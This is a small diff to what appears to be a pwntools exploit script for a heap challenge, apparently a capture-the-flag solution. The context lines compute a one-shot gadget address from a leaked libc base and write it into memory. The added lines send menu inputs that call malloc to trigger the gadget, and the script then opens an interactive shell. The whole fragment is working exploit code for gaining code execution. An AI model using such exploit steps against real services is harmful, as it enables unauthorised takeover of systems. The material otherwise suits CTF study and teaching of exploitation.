@@ -68,6 +68,12 @@ addr_oneshot = offset_oneshot + addr_libc_base
 new(size1, p64(addr_oneshot))
 
 
+#call malloc to execute oneshot
+p.sendlineafter(':', '1')
+p.sendlineafter(':', '0')
+p.sendlineafter(':', '10')
+
+
 p.interactive()
 
 
